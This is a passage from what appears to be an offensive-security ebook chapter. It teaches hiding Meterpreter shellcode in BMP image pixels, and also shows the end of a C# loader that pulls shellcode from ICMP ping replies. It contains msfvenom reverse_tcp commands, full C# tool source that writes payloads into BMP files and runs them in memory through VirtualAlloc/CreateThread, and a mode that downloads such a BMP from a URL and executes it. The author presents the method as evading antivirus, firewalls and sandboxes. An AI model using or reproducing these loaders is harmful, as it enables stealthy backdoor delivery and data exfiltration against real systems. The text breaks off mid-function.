Console.WriteLine(\"Bingo Meterpreter session by ICMPv4 traffic ;)\");\n\r\n\r                    UInt32 funcAddr = VirtualAlloc(0, (UInt32)__Bytes.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\r                    Marshal.Copy(__Bytes, 0, (IntPtr)(funcAddr), __Bytes.Length);\n\r\n\r                    IntPtr hThread = IntPtr.Zero;\n\r\n\r                    UInt32 threadId = 0;\n\r\n\r                    IntPtr pinfo = IntPtr.Zero;\n\r\n\r \n\r\n\r                    hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\n\r\n\r                    WaitForSingleObject(hThread, 0xFFFFFFFF);\n\r\n\r \n\r\n\r                }\n\r\n\r            }\n\r\n\r            catch (Exception _main)\n\r\n\r            {\n\r\n\r                Console.WriteLine(\"Main Error: {0}\", _main.Message);\n\r\n\r                Console.WriteLine(\"Main Error: Please use help , NativePayload_ICMP help\", _main.Message);\n\r\n\r            }\n\r\n\r        }\n\r\n\r \n\r\n\r \n\r\n\r        static Dictionary&lt;char, int&gt; HexDic = new Dictionary&lt;char, int&gt;\n\r\n\r        {\n\r\n\r             //// {\'0\',200},{\'1\',201},{\'2\',202},{\'3\',203},{\'4\',204},{\'5\',205},{\'6\',206},{\'7\',207},{\'8\',208}\n\r\n\r             //// ,{\'9\',209},{\'a\',210},{\'b\',211},{\'c\',212},{\'d\',213},{\'e\',214},{\'f\',215}\n\r\n\r \n\r\n\r             {\'0\',100},{\'1\',101},{\'2\',102},{\'3\',103},{\'4\',104},{\'5\',105},{\'6\',106},{\'7\',107},{\'8\',108}\n\r\n\r            ,{\'9\',109},{\'a\',110},{\'b\',111},{\'c\',112},{\'d\',113},{\'e\',114},{\'f\',115}\n\r\n\r        };\n\r\n\r \n\r\n\r        static string _HextoDecimal(string hexstring)\n\r\n\r        {\n\r\n\r \n\r\n\r            string result = \"\";\n\r\n\r            hexstring = hexstring.ToLower();\n\r\n\r            for (int i = 0; i &lt; hexstring.Length; i++)\n\r\n\r            {\n\r\n\r                char Oonagii = hexstring[hexstring.Length - 1 - i];\n\r\n\r                result += (HexDic[Oonagii] * (int)Math.Pow(16, i)).ToString() + \" \";\n\r\n\r            }\n\r\n\r            return result;\n\r\n\r        }\n\r\n\r \n\r\n\r\n\r\n\r        static string _Ping(string IPAddress_DNSName, int counter)\n\r\n\r        {\n\r\n\r            string Final_Dec = \"\";\n\r\n\r \n\r\n\r            try\n\r\n\r            {\n\r\n\r               \n\r\n\r                if (counter != 1) { counter = 1; }\n\r\n\r \n\r\n\r                /// Make icmp traffic for getting Meterpreter Payloads by Ping\n\r\n\r                ProcessStartInfo ns_Prcs_info = new ProcessStartInfo(\"ping.exe\", IPAddress_DNSName + \" -n \" + counter.ToString());\n\r\n\r                ns_Prcs_info.RedirectStandardInput = true;\n\r\n\r                ns_Prcs_info.RedirectStandardOutput = true;\n\r\n\r                ns_Prcs_info.UseShellExecute = false;\n\r\n\r \n\r\n\r \n\r\n\r                Process myPing = new Process();\n\r\n\r                myPing.StartInfo = ns_Prcs_info;\n\r\n\r                myPing.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;\n\r\n\r                myPing.Start();\n\r\n\r \n\r\n\r                //string result_Line0 = \"\";\n\r\n\r                string Pingoutput = myPing.StandardOutput.ReadToEnd();\n\r\n\r                string[] All_lines = Pingoutput.Split(\'\\t\', \'\\n\');\n\r\n\r \n\r\n\r                //int PayloadLines_current_id = 0;\n\r\n\r                foreach (var item in All_lines)\n\r\n\r                {\n\r\n\r                    if (item.StartsWith(\"Reply \"))\n\r\n\r                    {\n\r\n\r                        Final_Dec = item.Substring(item.Length - 4);\n\r\n\r                    }\n\r\n\r                    // debug\n\r\n\r                    // Console.WriteLine(item + \"\\n\"+ s);  \n\r\n\r                }\n\r\n\r \n\r\n\r            }\n\r\n\r            catch (Exception e)\n\r\n\r            {\n\r\n\r \n\r\n\r                Console.WriteLine(e.Message);\n\r\n\r            }\n\r\n\r            return Final_Dec;\n\r\n\r        }\n\r\n\r \n\r\n\r        public static UInt32 MEM_COMMIT = 0x1000;\n\r\n\r        public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\r\n\r \n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n\r\n\r    }\n\r\n\r}","","topics\\Chapter 10.html","\n\r\n\r \n\r\n\rHiding Payloads via BMP Image Pixels (PART1)\n\r\n\r \n\r\n\rIn this chapter I want to talk about Images File in this case “BMP” Files.  The idea for this chapter-11 is how can we use these Images files for Hiding Payload? (in this case Backdoor Payload for Infiltration and Exfiltration between two systems).\n\r\n\r \n\r\n\rNote : this Chapter has 2 Parts , in this “Part1” I will Explain what is this Method “step by step” by C# Code and in Second Part or (PART2) I talked about this method via Linux systems by “NativePayload_Image.sh” v.2 Code so in the next “PART2” we will talk about this script in Linux systems only but for understanding this Method you should Read first this “PART1”.\n\r\n\r \n\r\n\rNote : in the “PART2” I talked about “NativePayload_Image.sh” v2 Code and I talked about how to use this method via this Script for Secure Text-messaging also DATA Exfil/Infiltration via BMP Image Pixels , (Linux systems only)\n\r\n\r \n\r\n\rWhat is this IDEA ? \n\r\n\rIn this Method you can have Injected DATA/Payload by BMP Images , it means your DATA will Inject behind Image Pixels , with this method you can use Images for DATA Exfiltration or DATA Infiltration also with this method DATA transferring will be against Detection by Avs and Firewalls . (it is kind of Tunneling between two systems via BMP Files over Network traffic).\n\r\n\r \n\r\n\rThe Idea for transferring data with images is not new, but I want to talk about this because this is really dangerous. I want to talk about some important questions in relation to this threat.\n\r\n\rfor example : “why no one cares about this ?”\n\r\n\r \n\r\n\rWhy this method is important ?\n\r\n\rMy answer is : because the most AVs and Firewalls also Sandbox Tools will not Detect this Method or it is better to say Detecting this method is very difficult ! \n\r\n\r \n\r\n\rBefore everything let me show you one simple BMP Picture.\n\r\n\rAs you can see in “Picture 1” we have black background with red lines. Now tell me: Did you see something wrong in this picture? or something unreasonable?\n\r\n\r  \n\r\n\rPicture 1:\n\r\n\rNow in picture 2 I want to show you where the unreasonable points in this picture are, and probably you did not see this ! \n\r\n\rPicture 2: Malware Payload Injection behind Image Pixels\n\r\n\rNow that\'s the \"where\" and now I want to talk about the \"why\" this is dangerous and also the \"how\" can you do this ?\n\r\n\r \n\r\n\rImportant Questions! \n\r\n\r\n\r1.Why Transferring Payloads or Data by Images is Dangerous ? Because no one is thinking about this like important threat unfortunately .  \n\r\n\r\n\r2.Did you ever scan BMP files with anti-viruses before this and do you think Avs can Detect something for that ?  \n\r\n\r\n\r3.Did you use AV for realtime detection and realtime scanning BMP files ?  \n\r\n\r\n\r4.How many of these AVs can detect this threat ?  \n\r\n\r\n\r5.How can we detect this threat when some one published BMP files on a target website or infected website?  \n\r\n\r\n\r6.Can use this technique for web attacks‍ ? Or can we use this one for bypassing WAF also reading payloads from BMP files for Web Attack? \n\r\n\r\n\r7.For exfiltration to the Web and the network, this is one of the best ways for transferring payloads and data over port 80 or 443, especially (Port 80) with or without payload encryption in BMP files. (important)  \n\r\n\r\n\r8.Firewall or IPS/IDS what can these do for this threat, and how many of these tools can detect this technique ?  \n\r\n\r\n\r9.If I used this technique for my backdoors locally with encrypted payloads in these pictures, who can detect this and how ? Or If I used this technique by chunking BMP files‍, which means split-up payloads to more than 1 picture file, then who / which AVs can detect that type of payload delivery ?  \n\r\n\r\n\rHow can we do this ?\n\r\n\rFirst I want to talk about how can we do it manually without code by using a simple example. Then I will publish my C# code for this technique and I will also explain how to use my tool for this technique and in Part2 of this chapter-11 I will talk about Script code for this method on Linux systems only.\n\r\n\rIn this case we want to inject payloads to BMP Image file by adding or changing pixels. (only BMP format)\n\r\n\rSo each Pixel has color with RGB codes. In this technique we should inject our payloads to RGB code for each pixel so we have something like these steps :\n\r\n\rCode Behind Pixels\n\r\n\r \n\r\n\r        Pixel 1 = R(112) , G(255) , B(10)\n\r\n\r        Pixel 2 = R(192) , G(34) , B(84)\n\r\n\r        Pixel 3 = R(111) , G(0) , B(190)\n\r\n\r \n\r\n\rSo we have these RGB payloads 112,255,10,192,34,84,111,0,190\n\r\n\r \n\r\n\r        Decimal == hex \n\r\n\r \n\r\n\r        112 == 70 \n\r\n\r        255 == ff \n\r\n\r        10 == 0A \n\r\n\r        192 == C0 \n\r\n\r        34 == 22 \n\r\n\r        84 == 54         \n\r\n\r        111 == 6F \n\r\n\r        0 == 00 \n\r\n\r        190 == BE \n\r\n\r \n\r\n\rSo our Pixels had these Meterpreter Payloads: 70FF0AC022546F00BE\n\r\n\r \n\r\n\ras you can see in picture 3 we have Hex and Decimal also Color for each Pixel .Picture 3 : \n\r\n\rNow you can understand how and where BMP Files should be changed for this method.\n\r\n\r \n\r\n\rInjecting Meterpreter Payload to BMP file manually Step by step:\n\r\n\r \n\r\n\rNow in this section I want to talk about how can do these things Manually (step by step) :\n\r\n\rStep 1 : As the first step before everything else you need a BMP file in Windows so for this one you need to use MS Paint.\n\r\n\rNote : you should do these steps in windows only by MS Paint.\n\r\n\rAs you can see in picture 4 we have a blank BMP file with 700 * 2 pixels.\n\r\n\r  \n\r\n\rPicture 4: BMP file with 700 * 2 Pixels \n\r\n\r \n\r\n\rNote : You can save this file in (24-bit bitmap) color format.\n\r\n\rStep 2 : in Kali linux you should create a Meterpreter payload with one of these commands:\n\r\n\r \n\r\n\r\n\r•msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 -f c &gt; payload.txt \n\r\n\r\n\r•msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 -f num &gt; payload.txt \n\r\n\r\n\r\n\r\n\rStep 3 : now you should inject your payload in (step2) into the BMP file you made in (step1) with kali linux using a hexeditor or in windows with the “Hexeditor NEO” tool.\n\r\n\rIn “Picture 5” you can see the hex editor NEO for this BMP file you made in (Step1) before changing the payload.\n\r\n\r    \n\r\n\rPicture 5:\n\r\n\rNow in Picture 6 you can see we have 3 pixels with these Payloads respectively “70FF0A\" \"C02254\" \"6F00BE” \n\r\n\r \n\r\n\rPicture 6:\n\r\n\r \n\r\n\rYou can now see what happens in BMP when you want to inject these payloads to images in this case BMP.\n\r\n\rTo do this: in this step you should edit this BMP file (step1) in Kali linux with hexeditor commands like in picture 7 . \n\r\n\rThis time you should inject Meterpreter payloads into the file with this tool Copy-Paste from “Offset 36” up to end. Offset 36 is the first Byte after the BMP header (BMP Header is 54 bytes). In picture 5 you can see this section with the green line.\n\r\n\r \n\r\n\rNote : Before changing the BMP file you should change your Meterpreter payload from this type “0xfc” to this “fc” so your Payload should be something like “Pay.txt” file in Picture 9. (important) \n\r\n\rNow you should copy the payload string from “Pay.txt” and paste it into the Bitmap File from the Offset 36 up to the end like in picture 7 and 8. \n\r\n\rPicture 7: As you can see your payload started with “FC48” in Picture 7 also your payload finished with “FFD5” like picture 8 (payload text highlighted green). \n\r\n\rPicture 8:\n\r\n\rNow you can save this file.\n\r\n\rAfter these steps you will have something like in Picture 9. You now have one BMP file with an injected Meterpreter Payload.\n\r\n\r  \n\r\n\rPicture 9:\n\r\n\rAs you can see in picture 9 we have a bitmap file with more pixels .\n\r\n\rHow many pixels do we need for a Meterpreter Payload ?\n\r\n\rif we have 510 bytes Meterpreter Payload then we have 170 Pixels for payloads\n\r\n\r \n\r\n\r\n\r•510 Bytes payload , 3 is 1 byte for each : R + G + B ==&gt; 1+1+1 \n\r\n\r\n\r•510 / 3 = 170 Pixels \n\r\n\r\n\r•it means 0 …. 169 Pixels in MS Paint like picture 10. \n\r\n\r\n\r  \n\r\n\rPicture 10:\n\r\n\rAfter making this BMP File now you need some code to reading these payloads from the BMP file.\n\r\n\rI made one code in C# for reading meterpreter payloads from a BMP File and execute this code in memory like a backdoor. With my tool you can also make a new Bitmap file with meterpreter payload injection method and by this code you can modify other BMP files to inject a meterpreter payload to them. Finally my tool has a web feature that enables you to download a BMP file via it\'s URL over HTTP traffic and executing any hidden code in the BMP in memory like a backdoor.\n\r\n\r \n\r\n\r \n\r\n\r\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\rExecuting Meterpreter Payload from BMP file with “NativePayload_Image.exe” step by step :\n\r\n\r \n\r\n\rStep 1: If you want to see the NativePayload_Image Syntax, you should run this code without any switch like Picture 11:\n\r\n\r Picture 11: \n\r\n\rWith my code you can have very simple Meterpreter Session with this syntax for Local BMP files.\n\r\n\r \n\r\n\rfor (Backdoor Mode) with this tool like “Picture 11” you need this syntax :\n\r\n\r \n\r\n\r\n\r•Syntax : NativePayload_Image.exe bitmap “filename.bmp” [Meterpreter_payload_Length] [Header_Length] \n\r\n\r\n\r•Syntax : NativePayload_Image.exe bitmap “filename.bmp”  510  54﻿ \n\r\n\r\n\r \n\r\n\rNote : Meterpreter Payload Length was 510 ( Made by msfvenom tool with “-f C” or “-f num” )\n\r\n\rNote : BMP Header Length is 54 always \n\r\n\rPicture 12:\n\r\n\rAs you can see in “Picture 12” I had a meterpreter session‍ from the Local BMP file and this “NewBitmaImge.bmp” was my BMP file in Picture 9 and 10. \n\r\n\r \n\r\n\rSummary so far:\n\r\n\r \n\r\n\rSo you can see we can manually make bitmap files with the \"Meterpreter Payload Injection\" like in “Picture 9” and we can also execute meterpreter payloads from these bitmap files in memory with my C# Code like in “Picture 12”.\n\r\n\rIn this case backdoor and BMP file should be in the same directory but you can use path for a BMP file too.\n\r\n\r \n\r\n\rStep 2: Make a new bitmap file with the \"Meterpreter Payload Injection\" method using a tool. In this case you need to create a meterpreter payload by using one of these commands:\n\r\n\r \n\r\n\r\n\r•msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 -f c &gt; payload.txt \n\r\n\r\n\r•msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 -f num &gt; payload.txt \n\r\n\r\n\r \n\r\n\rNote : in this step you should change your output payload from Msfvenom like “picture13” .\n\r\n\rNote: change” 0xfc , 0x48 , 0x83 “ to this “fc,48,83, ...”\n\r\n\r  \n\r\n\rPicture 13:\n\r\n\rNow, like in picture 14, you should create a new bitmap file with New File_Name.\n\r\n\r Picture 14: \n\r\n\r\n\r\n\rAnd Correct Syntax is :\n\r\n\r \n\r\n\r\n\r•Syntax : NativePayload_Image.exe create “Newfilename.bmp” [Meterpreter_payload] \n\r\n\r\n\r•Syntax : NativePayload_Image.exe create “Newfilename.bmp” fc,48,83,.... \n\r\n\r\n\r \n\r\n\rstep 3 : Modify the BMP files for Injecting Meterpreter Payload to existing BMP files.\n\r\n\rIn this case you need the payload and also one BMP file for adding or injecting the payload to, like in picture 15. \n\r\n\r \n\r\n\rPicture 15:\n\r\n\r \n\r\n\rnow you should use this syntax to modify this file .\n\r\n\r \n\r\n\r\n\r•Syntax : NativePayload_Image.exe modify “Existfilename.bmp” [header_length] [Meterpreter_payload] \n\r\n\r\n\r•Syntax : NativePayload_Image.exe modify “Existfilename.bmp”  54  fc,48,83,.... \n\r\n\r\n\r \n\r\n\rNote : BMP header length is 54 always.\n\r\n\r  \n\r\n\rPicture 16:\n\r\n\r \n\r\n\rAs you can see in picture 16 after modifying this file, we can see the meterpreter payload pixels under the black Background after “300% Zooming“. Now, as you can see in the next picture, this modified BMP file will work very well.\n\r\n\r \n\r\n\rThis time I want to use this BMP file on a website for downloading over HTTP, so in this case we will use from “MyBMP_to_Modify.bmp”. This file was made in the previous step and I set up a web-server in Kali linux for Downloading this Bitmap file and to download this file I will use Switch “URL” .\n\r\n\r \n\r\n\rStep 4 : Downloading the BMP file from the website using the “URL” over HTTP Traffic.\n\r\n\r \n\r\n\rSo now we have this file “MyBMP_to_Modify.bmp” and I used this file in kali linux web-server via Python web-server by “python -m SimpleHTTPServer”. Finally I will have Meterpreter Session by  switch“url” like in “Picture 17”.\n\r\n\r \n\r\n\rin this case downloading the BMP file via Url our syntax is :\n\r\n\r \n\r\n\r\n\r•Syntax : NativePayload_Image.exe url “Url” [Meterpreter_payload_Length] [Header_Length] \n\r\n\r\n\r•Syntax : NativePayload_Image.exe url \"https://192.168.59.2:8000/MyBMP_to_Modify.bmp\"  510   54 \n\r\n\r\n\r   \n\r\n\rPicture 17 :\n\r\n\r \n\r\n\rAt a glance : this Technique was not NEW , Advanced Malwares used this method , but I think no one cares about this threat at the moment, but it is is really dangerous. We should check our Anti-viruses for this threat especially, since it also could be using an encrypted payload in the BMP file, and then its really undetectable for most Avs and Firewalls . Or the payloads could be chunked into more than one BMP file, and then its more dangerous than without any obfuscation, and I think that by default most AVs do not scan BMP extensions files in realtime or file-system manual scans. Also I don\'t think they can Detect this payload in BMP files (should be checked for AVs one by one) and if someone uses such a technique for exfiltration/infiltration, meaning to transfer out data (without using the backdoor payload in BMP files but just adding data inside BMP files), then what we can do as defenders, and how can we detect this exfiltration/infiltration method? and finally this is real good way to make Tunneling Traffic between two systems by malwares or hackers so in next PART2 of this Chapter-11 we will talk about this by more details and information about “Tunneling &amp; Text-messaging &amp; Transferring Commands via BMP Images over HTTP traffic and using this Method as Tunneling Traffic over HTTP/HTTPS”.\n\r\n\r \n\r\n\rNote : in the PART2 of Chapter-11 , I talked about “NativePayload_Image.sh v2” Code and how to use this method via this script for secure Text-messaging also DATA Exfil/Infiltration by BMP Image Pixels and Transferring Commands , (Linux systems only)\n\r\n\r \n\r\n\rImportant Points for C# Code :\n\r\n\r \n\r\n\r1. BMP Header file : \n\r\n\rin this section of code you can see we have BMP File Header “Bytes” . In this case my header was for one file with 604 * 2 Pixels And this header has 54 bytes Length. So remember this Point your header length is 54 bytes “always”.\n\r\n\rNote: in Picture 5 you can see this header with Green Line!\n\r\n\r \n\r\n\r        /// &lt;summary&gt;\n\r\n\r        ///  this Default_Header_BMP was for one BMP file with (604 * 2 pixels)\n\r\n\r        /// &lt;/summary&gt;\n\r\n\r        public static string Default_Header_BMP = \"42;4d;5e;0e;00;00;00;00;00;00;36;00;00;00;28;00;00;00;5c;02;00;00;02;00;00;00;01;00;18;00;00;00;00;00;28;0e;00;00;00;00;00;00;00;00;00;00;00;00;00;00;00;00;00;00\";\n\r\n\r \n\r\n\r2. Make New BMP file : \n\r\n\rin this section of code we have _BMP Variable with this Length :\n\r\n\r \n\r\n\rHeader.Length + X_Meterpreter.Length + Ex_Payload_Length\n\r\n\rheader.length is equal 54 \n\r\n\rX_Meterpreter.length is equal 510\n\r\n\rEx_Payload_Length is equal 3114\n\r\n\rso our BMP File will have 54 + 510 + 3114 bytes at least.\n\r\n\r \n\r\n\r   public static string InjectPayload_to_BMP(string X_Meterpreter ,string Header, Int32 Ex_Payload_Length , bool Is_New_or_Exist_File , string FileName)\n\r\n\r        {\n\r\n\r            try\n\r\n\r            {\n\r\n\r                if (Is_New_or_Exist_File)\n\r\n\r                {\n\r\n\r \n\r\n\r                    /// true is New File so should make New BMP file\n\r\n\r \n\r\n\r                    byte[] _BMP = new byte[Header.Length + X_Meterpreter.Length + Ex_Payload_Length];\n\r\n\r \n\r\n\r3. Adding Header to BMP file : \n\r\n\rin this section of code my Header will Inject to BMP Bytes in this case _BMP[] Variable.\n\r\n\r \n\r\n\r                    string[] _bmp_h = Header.Split(\';\');\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                    for (int i = 0; i &lt; _bmp_h.Length; i++)\n\r\n\r                    {\n\r\n\r                        if (i == 0)\n\r\n\r                        {\n\r\n\r                            Console.Write(\"[&gt;] Header adding (length {0}) : \", _bmp_h.Length.ToString());\n\r\n\r                        }\n\r\n\r                        if (i &lt;= 16)\n\r\n\r                        {\n\r\n\r                            Console.Write(_bmp_h[i].ToString());\n\r\n\r                        }\n\r\n\r                        _BMP[i] = Convert.ToByte(_bmp_h[i], 16);\n\r\n\r                    }\n\r\n\r \n\r\n\r4. Injecting Meterpreter Payload to BMP file : \n\r\n\rin this section of code you can see : Meterpreter Payload will Inject to BMP Bytes in this case _BMP[] Variable via this line code:  _BMP[j + _bmp_h.Length] = Convert.ToByte(_bmp_x[j], 16);\n\r\n\r \n\r\n\r                    Console.WriteLine(\"[+] Injecting Meterpreter Payload to Bitmap File ...\");\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                    string[] _bmp_x = X_Meterpreter.Split(\',\');\n\r\n\r                    for (int j = 0; j &lt; _bmp_x.Length; j++)\n\r\n\r                    {\n\r\n\r                        if (j == 0)\n\r\n\r                        {\n\r\n\r                            Console.Write(\"[&gt;] Injecting Payload (length {0}) : \", _bmp_x.Length.ToString());\n\r\n\r                        }\n\r\n\r                        if (j &lt;= 16)\n\r\n\r                        {\n\r\n\r                            Console.Write(_bmp_x[j]);\n\r\n\r                        }\n\r\n\r \n\r\n\r                        _BMP[j + _bmp_h.Length] = Convert.ToByte(_bmp_x[j], 16);\n\r\n\r                    }\n\r\n\r \n\r\n\r5. Injecting “0xff” or “0x00” bytes to BMP file : \n\r\n\ras you can see in this section of code I used “0xff” bytes for injecting after Meterpreter Payload but you can change it to “0x00” \n\r\n\rif you want to do this : \n\r\n\rjust change this value in source code from “ff” to “00” very simple. _BMP[k + _bmp_h.Length + _bmp_x.Length] = Convert.ToByte(\"ff\", 16);\n\r\n\r \n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                    Console.WriteLine(\"[+] Adding Ex-Payload for Bitmap File ...\");\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                    for (int k = 0; k &lt; Ex_Payload_Length; k++)\n\r\n\r                    {\n\r\n\r                        if (k == 0)\n\r\n\r                        {\n\r\n\r                            Console.Write(\"[&gt;] Ex-Payload adding (length FF * {0}).\", Ex_Payload_Length.ToString());\n\r\n\r                        }\n\r\n\r                        _BMP[k + _bmp_h.Length + _bmp_x.Length] = Convert.ToByte(\"ff\", 16);\n\r\n\r                    }\n\r\n\r \n\r\n\r                    /// time to create bmp file\n\r\n\r                    File.WriteAllBytes(FileName, _BMP);\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.WriteLine(\"[!] File {0} with length {1} bytes Created.\", FileName, _BMP.Length.ToString());\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r\n\r\n\r \n\r\n\rC# code : https://github.com/DamonMohammadbagher/NativePayload_Image\n\r\n\r \n\r\n\rusing System;\n\r\n\rusing System.Collections.Generic;\n\r\n\rusing System.Linq;\n\r\n\rusing System.Text;\n\r\n\rusing System.Threading.Tasks;\n\r\n\rusing System.IO;\n\r\n\rusing System.Runtime.InteropServices;\n\r\n\r \n\r\n\rnamespace NativePayload_Image\n\r\n\r{\n\r\n\r    class Program\n\r\n\r    {\n\r\n\r        /// .Net Framework 2.0 , 3.5 and 4.0 only supported\n\r\n\r        /// .Net Framework 4.5 and 4.6 Not Supported ;O\n\r\n\r        \n\r\n\r        /// Windows 2008 R2 tested with BMP Format only .\n\r\n\r        /// Note : tested and worked by MS Paint for Viewing bmp files only.\n\r\n\r        \n\r\n\r        /// in kali linux you can use \"hexeditor\" command and in windows you can use \"Hex editor NEO\".\n\r\n\r        /// for meterpreter payload\n\r\n\r        /// msfvenom --platfoem windows --arch x86_64 -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.2 -f c &gt; payload.txt\n\r\n\r        /// msfvenom --platfoem windows --arch x86_64 -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.2 -f num &gt; payload.txt\n\r\n\r \n\r\n\r        /// &lt;summary&gt;\n\r\n\r        ///  this Default_Header_BMP ws for one BMP file with (604 * 2 pixels)\n\r\n\r        /// &lt;/summary&gt;\n\r\n\r        public static string Default_Header_BMP = \"42;4d;5e;0e;00;00;00;00;00;00;36;00;00;00;28;00;00;00;5c;02;00;00;02;00;00;00;01;00;18;00;00;00;00;00;28;0e;00;00;00;00;00;00;00;00;00;00;00;00;00;00;00;00;00;00\";\n\r\n\r        /// &lt;summary&gt;\n\r\n\r        /// Ex_Payload_BMP_Length hardcoded ;)\n\r\n\r        /// &lt;/summary&gt;\n\r\n\r        public static int Ex_Payload_BMP_Length = 3114;\n\r\n\r        public static string Ex_Payload_BMP_byte = \"ff\";\n\r\n\r        public static string Xpayload_Meterpreter = \"\";\n\r\n\r        public static string InjectPayload_to_BMP(string X_Meterpreter ,string Header, Int32 Ex_Payload_Length , bool Is_New_or_Exist_File , string FileName)\n\r\n\r        {\n\r\n\r            try\n\r\n\r            {\n\r\n\r                if (Is_New_or_Exist_File)\n\r\n\r                {\n\r\n\r \n\r\n\r                    /// true is New File so should make New BMP file\n\r\n\r \n\r\n\r                    byte[] _BMP = new byte[Header.Length + X_Meterpreter.Length + Ex_Payload_Length];\n\r\n\r \n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                    Console.WriteLine(\"[!] Making New Bitmap File ...\");\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Yellow;\n\r\n\r                    Console.WriteLine(\"[!] Bitmap File Name : {0}\", FileName);\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                    Console.WriteLine(\"[+] Creating Header for Bitmap File ...\");\n\r\n\r                    string[] _bmp_h = Header.Split(\';\');\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                    for (int i = 0; i &lt; _bmp_h.Length; i++)\n\r\n\r                    {\n\r\n\r                        if (i == 0)\n\r\n\r                        {\n\r\n\r                            Console.Write(\"[&gt;] Header adding (length {0}) : \", _bmp_h.Length.ToString());\n\r\n\r                        }\n\r\n\r                        if (i &lt;= 16)\n\r\n\r                        {\n\r\n\r                            Console.Write(_bmp_h[i].ToString());\n\r\n\r                        }\n\r\n\r                        _BMP[i] = Convert.ToByte(_bmp_h[i], 16);\n\r\n\r                    }\n\r\n\r                    Console.Write(\"........\");\n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                    Console.WriteLine(\"[+] Injecting Meterpreter Payload to Bitmap File ...\");\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                    string[] _bmp_x = X_Meterpreter.Split(\',\');\n\r\n\r                    for (int j = 0; j &lt; _bmp_x.Length; j++)\n\r\n\r                    {\n\r\n\r                        if (j == 0)\n\r\n\r                        {\n\r\n\r                            Console.Write(\"[&gt;] Injecting Payload (length {0}) : \", _bmp_x.Length.ToString());\n\r\n\r                        }\n\r\n\r                        if (j &lt;= 16)\n\r\n\r                        {\n\r\n\r                            Console.Write(_bmp_x[j]);\n\r\n\r                        }\n\r\n\r \n\r\n\r                        _BMP[j + _bmp_h.Length] = Convert.ToByte(_bmp_x[j], 16);\n\r\n\r                    }\n\r\n\r                    Console.Write(\"........\");\n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                    Console.WriteLine(\"[+] Adding Ex-Payload for Bitmap File ...\");\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                    for (int k = 0; k &lt; Ex_Payload_Length; k++)\n\r\n\r                    {\n\r\n\r                        if (k == 0)\n\r\n\r                        {\n\r\n\r                            Console.Write(\"[&gt;] Ex-Payload adding (length FF * {0}).\", Ex_Payload_Length.ToString());\n\r\n\r                        }\n\r\n\r                        _BMP[k + _bmp_h.Length + _bmp_x.Length] = Convert.ToByte(\"ff\", 16);\n\r\n\r                    }\n\r\n\r \n\r\n\r                    /// time to create bmp file\n\r\n\r                    File.WriteAllBytes(FileName, _BMP);\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.WriteLine(\"[!] File {0} with length {1} bytes Created.\", FileName, _BMP.Length.ToString());\n\r\n\r \n\r\n\r \n\r\n\r                }\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            }\n\r\n\r            catch (Exception)\n\r\n\r            {\n\r\n\r \n\r\n\r                throw;\n\r\n\r            }\n\r\n\r            return \"\";\n\r\n\r        }\n\r\n\r        public static string InjectPayload_to_BMP(string X_Meterpreter, Int32 StartAddress, bool Is_New_or_Exist_File, string FileName)\n\r\n\r        {\n\r\n\r            try\n\r\n\r            {\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                Console.WriteLine(\"[!] Modify Bitmap File ...\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Yellow;\n\r\n\r                Console.WriteLine(\"[!] Bitmap File Name : {0}\", FileName);\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                Console.WriteLine(\"[+] Injecting Meterpreter Paylaod to Bitmap File ...\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                if (!Is_New_or_Exist_File)\n\r\n\r                {\n\r\n\r                    /// false is exist File so should insert payload to BMP file (it is overwritten)\n\r\n\r                    byte[] xPayload_Temp = File.ReadAllBytes(FileName);\n\r\n\r                    string[] _bmp_x = X_Meterpreter.Split(\',\');\n\r\n\r                    for (int i = 0; i &lt; 